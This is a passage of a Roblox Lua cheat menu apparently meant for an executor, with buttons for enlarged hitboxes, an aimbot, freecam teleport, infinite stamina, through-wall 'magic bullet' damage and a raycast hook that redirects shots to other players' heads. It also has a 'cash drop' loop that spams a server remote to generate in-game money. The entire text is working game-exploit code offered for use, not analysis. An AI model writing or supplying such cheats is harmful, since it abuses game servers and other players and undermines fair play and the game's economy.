local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local SizeLabel = Instance.new("TextLabel")
local HeadToggleButton = Instance.new("TextButton")
local AimToggleButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 180) -- Increased height for two buttons
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "PERSONAL PABLOVASCO"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 16
Title.Font = Enum.Font.SourceSansBold
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.25, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = SliderBack

-- Size text display
SizeLabel.Size = UDim2.new(1, 0, 0, 20)
SizeLabel.Position = UDim2.new(0, 0, 0.35, 0)
SizeLabel.BackgroundTransparency = 1
SizeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
SizeLabel.TextSize = 14
SizeLabel.Font = Enum.Font.SourceSans
SizeLabel.Text = "Size: " .. string.format("%.1f", _G.HeadSize)
SizeLabel.Parent = Frame

-- Head toggle button
HeadToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
HeadToggleButton.Position = UDim2.new(0.1, 0, 0.5, 0)
HeadToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
HeadToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
HeadToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
HeadToggleButton.TextSize = 14
HeadToggleButton.Font = Enum.Font.SourceSansBold
HeadToggleButton.Text = ""
HeadToggleButton.Parent = Frame

-- Aimbot toggle button
AimToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
AimToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
AimToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
AimToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
AimToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
AimToggleButton.TextSize = 14
AimToggleButton.Font = Enum.Font.SourceSansBold
AimToggleButton.Text = "Combine: Off"
AimToggleButton.Parent = Frame

-- Size slider logic
local dragging = false
local function updateSize(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newSize = 1 + percent * 9
    _G.HeadSize = newSize
    SizeLabel.Text = "Size: " .. string.format("%.1f", newSize)
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local mousePos = UIS:GetMouseLocation()
        local percent = (mousePos.X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateSize(percent)
    end
end)

-- Head toggle
HeadToggleButton.MouseButton1Click:Connect(function()
    _G.Disabled = not _G.Disabled
    if _G.Disabled then
        HeadToggleButton.Text = ""
        HeadToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        HeadToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    else
        HeadToggleButton.Text = ""
        HeadToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        HeadToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    end
end)

-- Aimbot toggle
AimToggleButton.MouseButton1Click:Connect(function()
    _G.AimEnabled = not _G.AimEnabled
    if _G.AimEnabled then
        AimToggleButton.Text = "Combine: On"
        AimToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        AimToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    else
        AimToggleButton.Text = "Combine: Off"
        AimToggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        AimToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    end
end)

-- Initial setup
updateSize((_G.HeadSize - 1) / 9)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FREECAM TELEPORT PRESS Q [3KTG]", function()
	-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local cam = workspace.CurrentCamera

-- Settings
local MOVE_SPEED = 100
local SPRINT_MULTIPLIER = 2
local MOUSE_SENSITIVITY = 0.45
local MAX_PITCH = 90

-- State
local enabled = false
local yaw = 0
local pitch = 0
local moveDir = Vector3.new()
local sprint = false
local originalCameraType
local originalMouseBehavior
local originalMouseIconEnabled
local humanoid
local savedWalkSpeed
local savedJumpPower
local justToggled = false
local lastCamCFrame -- ‚úÖ store final freecam position

-- Helpers
local function addKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir += Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir += Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir += Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir += Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir += Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir += Vector3.new(0,-1,0) end
end

local function removeKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir -= Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir -= Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir -= Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir -= Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir -= Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir -= Vector3.new(0,-1,0) end
end

-- ‚úÖ Toggle freecam + TP on exit
local function toggleFreecam()
	enabled = not enabled
	moveDir = Vector3.new()
	sprint = false
	justToggled = true

	if enabled then
		-- Save original states
		originalCameraType = cam.CameraType
		originalMouseBehavior = UserInputService.MouseBehavior
		originalMouseIconEnabled = UserInputService.MouseIconEnabled

		-- Freeze character
		if player.Character then
			humanoid = player.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				savedWalkSpeed = humanoid.WalkSpeed
				savedJumpPower = humanoid.JumpPower
				humanoid.WalkSpeed = 0
				humanoid.JumpPower = 0
			end
		end

		-- Set yaw/pitch
		local x, y, z = cam.CFrame:ToEulerAnglesYXZ()
		pitch = math.deg(x)
		yaw = math.deg(y)

		cam.CameraType = Enum.CameraType.Scriptable
		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false
	else
		-- ‚úÖ Save final camera position before restoring
		lastCamCFrame = cam.CFrame

		-- Restore character movement
		if humanoid then
			humanoid.WalkSpeed = savedWalkSpeed or 16
			humanoid.JumpPower = savedJumpPower or 50
		end
		cam.CameraType = originalCameraType or Enum.CameraType.Custom
		UserInputService.MouseBehavior = originalMouseBehavior or Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = originalMouseIconEnabled

		-- ‚úÖ Teleport character where freecam stopped
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and lastCamCFrame then
			player.Character.HumanoidRootPart.CFrame = CFrame.new(lastCamCFrame.Position)
		end
	end
end

-- Keybind
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end

	if input.KeyCode == Enum.KeyCode.Q then
		toggleFreecam()
		return
	end

	if justToggled then return end

	if enabled and input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.LeftShift then
			sprint = true
		else
			addKeyDirection(input.KeyCode)
		end
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe or not enabled then return end
	if justToggled then return end

	if input.KeyCode == Enum.KeyCode.LeftShift then
		sprint = false
	else
		removeKeyDirection(input.KeyCode)
	end
end)

-- Mouse look
UserInputService.InputChanged:Connect(function(input, gpe)
	if not enabled then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		yaw -= input.Delta.X * MOUSE_SENSITIVITY
		pitch = math.clamp(pitch - input.Delta.Y * MOUSE_SENSITIVITY, -MAX_PITCH, MAX_PITCH)
	end
end)

-- Camera movement
RunService.RenderStepped:Connect(function(dt)
	if justToggled then
		justToggled = false
	end
	if not enabled then return end

	local rot = CFrame.Angles(0, math.rad(yaw), 0) * CFrame.Angles(math.rad(pitch), 0, 0)
	local localMove = (rot.RightVector * moveDir.X + rot.UpVector * moveDir.Y + rot.LookVector * moveDir.Z)
	local speed = MOVE_SPEED * (sprint and SPRINT_MULTIPLIER or 1)
	local newPos = cam.CFrame.Position + localMove * speed * dt
	cam.CFrame = CFrame.new(newPos) * rot
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CASH DROP [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

--// Main GUI
local gui = Instance.new("ScreenGui")
gui.Name = "CashDropGUI"
gui.ResetOnSpawn = false
gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 200)
frame.Position = UDim2.new(0.5, -150, 0.5, -100)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- solid black
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

-- UI Corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

-- Title (White)
local title = Instance.new("TextLabel")
title.Text = "TAONG GOMA CASH"
title.Size = UDim2.new(1, 0, 0, 35)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.Parent = frame

-- Username
local usernameLabel = Instance.new("TextLabel")
usernameLabel.Text = "Username:"
usernameLabel.Size = UDim2.new(0, 100, 0, 25)
usernameLabel.Position = UDim2.new(0, 15, 0, 45)
usernameLabel.BackgroundTransparency = 1
usernameLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
usernameLabel.Font = Enum.Font.Gotham
usernameLabel.TextSize = 14
usernameLabel.TextXAlignment = Enum.TextXAlignment.Left
usernameLabel.Parent = frame

-- Locked Username TextBox (auto-filled)
local usernameBox = Instance.new("TextBox")
usernameBox.Size = UDim2.new(0, 170, 0, 25)
usernameBox.Position = UDim2.new(0, 110, 0, 45)
usernameBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
usernameBox.Font = Enum.Font.Gotham
usernameBox.TextSize = 14
usernameBox.BorderSizePixel = 0
usernameBox.Text = Players.LocalPlayer.Name
usernameBox.PlaceholderText = Players.LocalPlayer.Name
usernameBox.ClearTextOnFocus = false
usernameBox.TextEditable = false -- lock to prevent editing
usernameBox.Parent = frame

local corner2 = corner:Clone()
corner2.Parent = usernameBox

-- Amount
local amountLabel = Instance.new("TextLabel")
amountLabel.Text = "Amount:"
amountLabel.Size = UDim2.new(0, 100, 0, 25)
amountLabel.Position = UDim2.new(0, 15, 0, 80)
amountLabel.BackgroundTransparency = 1
amountLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
amountLabel.Font = Enum.Font.Gotham
amountLabel.TextSize = 14
amountLabel.TextXAlignment = Enum.TextXAlignment.Left
amountLabel.Parent = frame

local amountBox = Instance.new("TextBox")
amountBox.PlaceholderText = "Enter amount"
amountBox.Text = "0.1"
amountBox.Size = UDim2.new(0, 170, 0, 25)
amountBox.Position = UDim2.new(0, 110, 0, 80)
amountBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
amountBox.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.BorderSizePixel = 0
amountBox.Parent = frame

local corner3 = corner:Clone()
corner3.Parent = amountBox

-- Start Button (White)
local startBtn = Instance.new("TextButton")
startBtn.Text = "START"
startBtn.Size = UDim2.new(0, 120, 0, 30)
startBtn.Position = UDim2.new(0, 25, 0, 125)
startBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White
startBtn.TextColor3 = Color3.fromRGB(0, 0, 0) -- Text Black
startBtn.Font = Enum.Font.GothamBold
startBtn.TextSize = 16
startBtn.BorderSizePixel = 0
startBtn.Parent = frame

local corner4 = corner:Clone()
corner4.Parent = startBtn

-- Stop Button (White)
local stopBtn = Instance.new("TextButton")
stopBtn.Text = "STOP"
stopBtn.Size = UDim2.new(0, 120, 0, 30)
stopBtn.Position = UDim2.new(0, 155, 0, 125)
stopBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White
stopBtn.TextColor3 = Color3.fromRGB(0, 0, 0) -- Text Black
stopBtn.Font = Enum.Font.GothamBold
stopBtn.TextSize = 16
stopBtn.BorderSizePixel = 0
stopBtn.Parent = frame

local corner5 = corner:Clone()
corner5.Parent = stopBtn

-- Status Label
local statusLabel = Instance.new("TextLabel")
statusLabel.Text = "Status: Idle"
statusLabel.Size = UDim2.new(1, 0, 0, 25)
statusLabel.Position = UDim2.new(0, 0, 0, 165)
statusLabel.BackgroundTransparency = 1
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200) -- Light gray
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 14
statusLabel.Parent = frame

-- Logic
local running = false
local dropThread

startBtn.MouseButton1Click:Connect(function()
	if running then return end
	running = true
	statusLabel.Text = "Status: Dropping..."
	statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White

	dropThread = task.spawn(function()
		while running do
			local username = usernameBox.Text
			local amount = tonumber(amountBox.Text) or 0.1
			ReplicatedStorage.DropCash:FireServer(username, amount)
			task.wait()
		end
	end)
end)

stopBtn.MouseButton1Click:Connect(function()
	running = false
	statusLabel.Text = "Status: Idle"
	statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200) -- Light gray
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("INFINITE STAMINA [TEST]", function()
	--// Infinite Stamina Script | Solara Executor

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- Wait for character and HRP
repeat wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
local staminaValue = nil

-- Find stamina value (check common implementations)
local function findStamina()
    if humanoid then
        local stamina = humanoid:FindFirstChild("Stamina")
        if stamina and stamina:IsA("NumberValue") then
            return stamina
        end
        -- Fallback: Check for custom stamina attributes
        local stats = humanoid:FindFirstChild("HumanoidDescription")
        if stats then
            for _, child in pairs(stats:GetChildren()) do
                if child.Name:lower():find("stamina") then
                    return child
                end
            end
        end
    end
    -- Fallback: Assume a default max stamina value
    return nil
end

-- Update stamina
local function updateStamina()
    if not humanoid or not humanoid.Health > 0 then return end
    staminaValue = findStamina()
    if staminaValue and staminaValue:IsA("NumberValue") then
        staminaValue.Value = 100 -- Reset to max (adjust based on game)
    elseif humanoid then
        -- Generic stamina reset (if no NumberValue found)
        humanoid.WalkSpeed = 16 -- Maintain normal speed
        humanoid.JumpPower = 50 -- Maintain normal jump (adjust based on game)
    end
end

-- Update loop (auto-enabled)
RunService.RenderStepped:Connect(function()
    updateStamina()
end)

print("[Stamina] Infinite Stamina enabled! Note: May require game-specific tweaks.")
end)

--// 8 Buttons in Main Menu
addMainMenuButton("MAGIC BULLET WALLBANG [TEST]", function()
	--// Magic Bullet (Unlimited Wallbang) Script | Bullets Through Walls | Solara Executor

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Wait for character and HRP
repeat wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

-- Magic Bullet Variables
local wallbangEnabled = true -- Auto-enabled
local maxRange = 1000 -- Max bullet range (adjust if needed)
local ignoreList = {LocalPlayer.Character} -- Ignore self

-- Function to perform unlimited wallbang raycast
local function wallbangRaycast(origin, direction)
    if not wallbangEnabled then return end
    
    local raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    raycastParams.FilterDescendantsInstances = ignoreList
    raycastParams.IgnoreWater = true
    
    local currentOrigin = origin
    local remainingDistance = maxRange
    local segmentDistance = 50 -- Distance per raycast segment
    
    while remainingDistance > 0 do
        local rayDistance = math.min(segmentDistance, remainingDistance)
        local raycastResult = workspace:Raycast(currentOrigin, direction * rayDistance, raycastParams)
        
        if raycastResult then
            local hitPart = raycastResult.Instance
            local hitPosition = raycastResult.Position
            local hitNormal = raycastResult.Normal
            
            -- Check if hit is a wall or penetrable object
            if hitPart and (hitPart.Size.Magnitude < 2 or hitPart.Material == Enum.Material.Concrete or hitPart.Material == Enum.Material.Brick) then
                currentOrigin = hitPosition + hitNormal * 0.1 -- Move past the wall
                remainingDistance = remainingDistance - rayDistance
            else
                -- Hit a non-wall object (e.g., player)
                local hitCharacter = hitPart and hitPart.Parent
                local hitPlayer = hitCharacter and Players:GetPlayerFromCharacter(hitCharacter)
                if hitPlayer and hitPlayer ~= LocalPlayer then
                    -- Fire remote event to damage (adapt to game's remote)
                    local fireRemote = ReplicatedStorage:FindFirstChild("Fire") or ReplicatedStorage:FindFirstChild("Shoot") or ReplicatedStorage:FindFirstChild("Damage")
                    if fireRemote and fireRemote:IsA("RemoteEvent") then
                        fireRemote:FireServer(hitPlayer.Character.HumanoidRootPart, hitPosition)
                    end
                    print("[Magic Bullet] Wallbang hit: " .. hitPlayer.Name .. " at " .. math.floor((hitPosition - origin).Magnitude) .. " studs")
                end
                break
            end
        else
            break -- No hit, end of range
        end
    end
end

-- Hook into mouse click for firing (adapt to your gun tool)
local mouse = LocalPlayer:GetMouse()
mouse.Button1Down:Connect(function()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local origin = Camera.CFrame.Position
        local direction = (mouse.Hit.Position - origin).Unit
        
        wallbangRaycast(origin, direction)
    end
end)

-- Update ignore list for new players/characters
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        table.insert(ignoreList, character)
    end)
end)

-- Auto-update for existing players
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer and player.Character then
        table.insert(ignoreList, player.Character)
    end
    player.CharacterAdded:Connect(function(character)
        table.insert(ignoreList, character)
    end)
end

print("[Magic Bullet] Unlimited Wallbang enabled! Bullets penetrate walls at any distance up to " .. maxRange .. " studs.")
end)

--// 8 Buttons in Main Menu
addMainMenuButton("NO SPREAD [TEST]", function()
    -- Universal No Spread Script for Guns
-- Hooks into raycast-based shooting to remove spread

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

-- Wait for character to load
repeat task.wait() until LocalPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

-- Settings
local noSpreadEnabled = true
local targetPart = "Head" -- Adjust based on game (e.g., "Head", "HumanoidRootPart")

-- Helper: Get direction from camera to screen center
local function getAimDirection()
    local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
    local ray = Camera:ViewportPointToRay(screenCenter.X, screenCenter.Y)
    return ray.Direction
end

-- Original raycast function to preserve
local oldRaycast = workspace.Raycast

-- Override raycast to remove spread
workspace.Raycast = function(...)
    local args = {...}
    local origin = args[1]
    local direction = args[2]

    if noSpreadEnabled and origin and direction then
        -- Get the intended aim direction (no spread)
        local aimDirection = getAimDirection()
        -- Return a modified raycast result with no spread
        local target = nil
        local closestDist = math.huge
        local players = Players:GetPlayers()

        for _, player in pairs(players) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(targetPart) then
                local part = player.Character[targetPart]
                local screenPoint, onScreen = Camera:WorldToScreenPoint(part.Position)
                if onScreen then
                    local dist = (Vector2.new(screenPoint.X, screenPoint.Y) - Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)).Magnitude
                    if dist < closestDist then
                        closestDist = dist
                        target = part
                    end
                end
            end
        end

        if target then
            return {
                Instance = target,
                Position = target.Position,
                Normal = (origin - target.Position).Unit,
                Material = Enum.Material.SmoothPlastic
            }
        else
            -- If no target, use the precise aim direction
            local raycastResult = oldRaycast(origin, aimDirection * 1000, RaycastParams.new())
            return raycastResult or oldRaycast(origin, direction, RaycastParams.new())
        end
    end

    -- Fallback to original raycast if noSpread is disabled or conditions not met
    return oldRaycast(...)
end

print("[No Spread] Enabled for all guns. Targeting:", targetPart)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PERSONAL CHESTER", function()
	--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

--// AIMBOT SETTINGS
local AimEnabled = false
local AimbotMode = "Instant"
local Smoothness = 1
local BaseFOV = 5

--// CROSSHAIR DATA
local Crosshairs = {
    {id = 1827745860, name = "Dot", fovMult = 0.5},
    {id = 5998624788, name = "Circle", fovMult = 1.2},
    {id = 749187669, name = "Cross", fovMult = 1.0},
    {id = 1469004289, name = "Small X", fovMult = 0.7},
    {id = 11722368344, name = "Big Circle", fovMult = 2.0},
    {id = 2614612882, name = "Thin Cross", fovMult = 0.8},
    {id = 749187664, name = "Plus", fovMult = 0.9},
    {id = 251435889, name = "Classic", fovMult = 1.1},
    {id = 5143056985, name = "Red Dot", fovMult = 0.6},
    {id = 11759202791, name = "Holo", fovMult = 1.5},
    {id = 1478500977, name = "Star", fovMult = 1.3},
    {id = 11726821301, name = "Neon", fovMult = 1.1},
    {id = 5536063313, name = "Target", fovMult = 1.4},
    {id = 11746928636, name = "Scope", fovMult = 1.8},
    {id = 11759198682, name = "Ring", fovMult = 1.6},
    {id = 11826465934, name = "Hex", fovMult = 1.0},
    {id = 11927593271, name = "Glow", fovMult = 1.7},
    {id = 11867351018, name = "Tech", fovMult = 1.2},
    {id = 4048495272,   name = "Pulse", fovMult = 0.9},
    {id = 10891594364,  name = "Vortex", fovMult = 1.4},
    {id = 5998624778,   name = "Mini Dot", fovMult = 0.6},
    {id = 2207556774,   name = "Arrow", fovMult = 1.1},
    {id = 426730675,    name = "Bracket", fovMult = 1.0},
    {id = 11754490336,  name = "Hollow", fovMult = 1.3},
    {id = 10868459554,  name = "Trident", fovMult = 1.2},
    {id = 11719595129,  name = "Blade", fovMult = 0.8},
    {id = 1489774665,   name = "Nexus", fovMult = 1.5},
    {id = 6079707648,   name = "Core", fovMult = 0.7},
    {id = 11390723044,  name = "Phantom", fovMult = 1.6},
    {id = 10878218322,  name = "Ghost", fovMult = 1.1},
    {id = 11722081515,  name = "Razor", fovMult = 0.9},
    {id = 11390723057,  name = "Spike", fovMult = 1.0},
    {id = 251497633,    name = "Retro", fovMult = 1.2},
    {id = 11722153703,  name = "Fusion", fovMult = 1.7},
    {id = 8680062686,   name = "Nova", fovMult = 1.4},
    {id = 11350518862,  name = "Apex", fovMult = 1.3},
    {id = 11722554017,  name = "Zenith", fovMult = 1.8},
    {id = 8360620314,   name = "Echo", fovMult = 1.0},
    {id = 11988231127,  name = "Spectre", fovMult = 1.5},
    {id = 11830989304,  name = "Cipher", fovMult = 1.2},
    {id = 11759293285,  name = "Omega", fovMult = 1.6},
    {id = 11754499452,  name = "Sigma", fovMult = 0.8},
    {id = 2555584348,   name = "Delta", fovMult = 1.1},
    {id = 11717828297,  name = "Gamma", fovMult = 1.3},
    {id = 11724945237,  name = "Theta", fovMult = 1.4},
    {id = 11733801922,  name = "Kappa", fovMult = 1.0},
    {id = 11733622734,  name = "Lambda", fovMult = 1.2},
    {id = 11754273720,  name = "Mu", fovMult = 0.9},
    {id = 11754490994,  name = "Nu", fovMult = 1.1},
    {id = 11756696859,  name = "Xi", fovMult = 1.5},
    {id = 11802094220,  name = "Omicron", fovMult = 1.3},
    {id = 11867337948,  name = "Pi", fovMult = 1.0},
    {id = 11915656516,  name = "Rho", fovMult = 1.4},
    {id = 11986603133,  name = "Tau", fovMult = 1.7}
}

local CurrentCrosshair = Crosshairs[1]
local CurrentFOV = BaseFOV * CurrentCrosshair.fovMult

--// GUI SETUP
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "CrosshairAimbotGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

--// CROSSHAIR
local crosshair = Instance.new("ImageLabel")
crosshair.Name = "CenterCrosshair"
crosshair.Image = "rbxassetid://" .. tostring(CurrentCrosshair.id)
crosshair.Size = UDim2.new(0, 32, 0, 32)
crosshair.AnchorPoint = Vector2.new(0.5, 0.5)
crosshair.Position = UDim2.new(0.5, 0, 0.46, 0)
crosshair.BackgroundTransparency = 1
crosshair.ZIndex = 10
crosshair.Active = false
crosshair.Parent = screenGui

--// HIDE CROSSHAIR (I)
UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.I then
		crosshair.Visible = not crosshair.Visible
	end
end)

--// MAIN FRAME
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 340, 0, 560)
mainFrame.Position = UDim2.new(0, 20, 0.5, -280)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

--// TITLE
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.Text = "CROSSHAIR AIMBOT - GOMA"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = title

--// SCROLL FRAME
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, -20, 1, -160)
scrollFrame.Position = UDim2.new(0, 10, 0, 55)
scrollFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
scrollFrame.ScrollBarThickness = 6
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
scrollFrame.BorderSizePixel = 0
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.Parent = mainFrame

local layout = Instance.new("UIGridLayout")
layout.CellSize = UDim2.new(0, 85, 0, 95)
layout.CellPadding = UDim2.new(0, 12, 0, 12)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = scrollFrame

--// SETTINGS FRAME
local settingsFrame = Instance.new("Frame")
settingsFrame.Size = UDim2.new(1, -20, 0, 110)
settingsFrame.Position = UDim2.new(0, 10, 1, -120)
settingsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
settingsFrame.BorderSizePixel = 0
settingsFrame.Parent = mainFrame

local settingsCorner = Instance.new("UICorner")
settingsCorner.CornerRadius = UDim.new(0, 10)
settingsCorner.Parent = settingsFrame

-- Mode Label
local modeLabel = Instance.new("TextLabel")
modeLabel.Text = "Aimbot Mode:"
modeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
modeLabel.Size = UDim2.new(0, 120, 0, 25)
modeLabel.Position = UDim2.new(0, 10, 0, 10)
modeLabel.BackgroundTransparency = 1
modeLabel.Font = Enum.Font.Gotham
modeLabel.TextSize = 14
modeLabel.Parent = settingsFrame

-- Mode Dropdown Button
local modeDropdown = Instance.new("TextButton")
modeDropdown.Text = "Mode: Instant"
modeDropdown.Size = UDim2.new(0, 160, 0, 25)
modeDropdown.Position = UDim2.new(0, 140, 0, 10)
modeDropdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
modeDropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
modeDropdown.Font = Enum.Font.Gotham
modeDropdown.TextSize = 14
modeDropdown.Parent = settingsFrame

local dropdownCorner = Instance.new("UICorner")
dropdownCorner.CornerRadius = UDim.new(0, 8)
dropdownCorner.Parent = modeDropdown

-- Toggle Mode Function
modeDropdown.MouseButton1Click:Connect(function()
	if AimbotMode == "Instant" then
		AimbotMode = "Smooth"
		modeDropdown.Text = "Mode: Smooth"
	else
		AimbotMode = "Instant"
		modeDropdown.Text = "Mode: Instant"
	end
end)

